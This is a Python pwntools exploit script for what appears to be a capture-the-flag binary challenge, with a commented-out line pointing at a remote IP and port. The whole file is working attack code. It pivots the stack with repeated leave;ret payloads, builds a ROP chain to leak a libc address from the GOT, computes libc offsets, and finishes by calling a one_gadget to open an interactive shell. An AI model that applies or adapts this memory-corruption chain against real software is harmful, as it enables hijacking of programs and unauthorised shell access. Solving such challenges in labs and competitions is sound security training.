from pwn import *
import codecs
p = process('./chall')
# p = remote('188.166.177.88', 11101)
write_plt = 0x401030
help_write = 0x4011d1
help_write_2 = 0x4011fd
help_read = 0x4011f1
help_read_2 = 0x4011c5
fun1 = 0x00000000004011bd
leave_ret = 0x000000000040121e
buff_ano = 0x404050
got = 0x403fd0+0x8
pop_rsi = 0x0000000000401299
pop_rdi = 0x000000000040129b
ret = 0x000000000040121f

payload = p64(buff_ano) + p64(help_read)
p.sendafter("yow:", payload)

payload = p64(0xdeadbeef) + p64(buff_ano) + p64(leave_ret)
p.sendafter("yaharo:", payload)

payload = p64(0x404070) + p64(got) + p64(fun1)
p.sendafter("yaharo:", payload)

payload = p64(0xdeadbeef) + p64(0xdeadbeef)
p.sendafter("yow:", payload)

payload = p64(got) + p64(buff_ano+0x10) + p64(help_read)
p.sendafter("yaharo:", payload)

payload = p64(help_write) + p64(ret) + p64(fun1)
p.sendafter("yaharo:", payload)

payload = p64(0x00000000004011f1) + p64(help_write)
p.sendafter("yow:", payload)

payload = p64(fun1) + p64(0x0000000000404068) + p64(help_read_2)
p.sendafter("yaharo:", payload)

payload = p64(got) + p64(help_write)
p.sendafter("yow:", payload)

payload = p64(fun1) + p64(buff_ano-8) + p64(fun1)
p.sendafter("yaharo:", payload)

payload = p64(got) + p64(0x00000000004011f1)
p.sendafter("yow:", payload)

payload = p64(help_write_2) + p64(buff_ano-8) + p64(fun1)
p.sendafter("yaharo:", payload)

payload = p64(pop_rsi) + p64(got)
p.sendafter("yow:", payload)

payload = p64(fun1) + p64(buff_ano-8) + p64(leave_ret)
p.sendafter("yaharo:", payload)

libc_leak = int(codecs.encode(p.recvuntil(b'\x7f')[-6:][::-1], 'hex'),
16)
print(hex(libc_leak))
libc_base = libc_leak - 0x0cb310
print(hex(libc_base))
system = libc_base + 0x055410
bin_sh = libc_base + 0x1b75aa
gets = libc_base + 0x0000000000075b60
one_gadget = libc_base + 0xcbd20
pop_rdx = libc_base +0x00000000000cb1cd
read_plt = 0x401050

payload = p64(pop_rdx) + p64(0x500) + p64(read_plt)
sleep(0.5)
p.send_raw(payload)

payload = p64(ret)*20 + p64(pop_rsi) + p64(0)*2 + p64(pop_rdx) + p64(0) + p64(one_gadget)
sleep(0.5)
p.send_raw(payload)

p.interactive()
p.close()